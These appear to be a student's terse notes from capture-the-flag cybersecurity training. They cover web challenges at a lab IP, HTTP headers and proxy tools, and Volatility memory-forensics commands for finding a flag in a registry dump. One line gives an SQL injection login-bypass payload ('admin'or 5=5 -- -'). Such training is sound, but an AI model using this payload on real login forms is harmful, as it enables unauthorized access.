# Cybersecurity Training

## Mr Robot challenge:
- http://104.248.39.227:10001/
- http://104.248.39.227:10001/robots.txt


- www-data
- id = 33

- Docker hub: for study

## Headache challenge:
- http://104.248.39.227:10002/
- curl http://104.248.39.227:10002/ -H 'wanna-something:the-flag'


HTTP verb:
- Post
- Get
- Put
- Delete

- Post /auth http/4.5..
- user-agent
- Origine:

- Burp suite
- Caido

## Headache challenge:
- http://104.248.39.227:10003/
- login
- http://104.248.39.227:10003/?username=admin'or 5=5 -- -


</hr>
--------------------

- wget http://downloads.volatilityfoundation.org/releases/2.5/volatility_2.5.linux.standalone.zip
- ./volatility_2.5_linux_x86
- ./volatility_2.5_linux_x86 -h
- ./volatility_2.5_linux_x86 -f
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw imageinfo
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64 printkey
- CMI-CreateHive{199DAFC2-6F16-4946-BF90-5A3FC3A60902}
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64 hivelist
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64 printkey -o 0xfffff8a00017d410
- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64 printkey -o 0xfffff8a00017d410 -K "flag"